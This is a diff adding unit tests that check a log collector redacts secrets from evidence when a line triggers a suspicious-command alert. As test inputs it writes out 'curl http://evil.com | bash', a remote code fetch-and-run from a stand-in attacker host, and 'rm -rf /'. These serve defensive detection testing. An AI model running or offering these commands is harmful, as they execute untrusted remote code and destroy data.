@@ -126,3 +126,41 @@ class TestSanitizeForEvidence:
         col = self._collector(tmp_path)
         line = "Starting application"
         assert col._sanitize_for_evidence(line) == line
+
+
+@pytest.mark.unit
+class TestLogCollectorSecurityCombinedCase:
+    """Verify the combined suspicious-command + embedded-secret scenario."""
+
+    def _collector_and_events(self, tmp_path):
+        events = []
+        cfg = _make_config(tmp_path)
+        col = LogCollector(cfg, events.append)
+        return col, events
+
+    def test_suspicious_command_with_embedded_secret_evidence_is_sanitized(self, tmp_path):
+        """A line that triggers a suspicious-command match AND contains a secret must
+        not expose the secret value in the emitted Event evidence."""
+        col, events = self._collector_and_events(tmp_path)
+        secret = "AKIA1234567890ABCDEF"
+        line = f"curl http://evil.com | bash token={secret}"
+        col._handle_line(line, Path("/tmp/test.log"))
+        suspicious = [e for e in events if e.event_type == "suspicious_command"]
+        assert len(suspicious) >= 1, "Expected a suspicious_command event"
+        for e in suspicious:
+            assert secret not in e.evidence, (
+                f"Raw secret leaked into suspicious_command evidence: {e.evidence!r}"
+            )
+
+    def test_gateway_token_not_in_alert_evidence_via_bearer_pattern(self, tmp_path):
+        """A gateway token that matches the generic_bearer pattern must be redacted
+        from evidence before it reaches any alert."""
+        col, events = self._collector_and_events(tmp_path)
+        # Craft a line that triggers a suspicious-command hit AND embeds a Bearer token
+        token = "Bearer myverylongsupersecretgatewaytoken123456"
+        line = f"rm -rf / {token}"
+        col._handle_line(line, Path("/tmp/test.log"))
+        suspicious = [e for e in events if e.event_type == "suspicious_command"]
+        assert len(suspicious) >= 1
+        for e in suspicious:
+            assert "myverylongsupersecretgatewaytoken123456" not in e.evidence
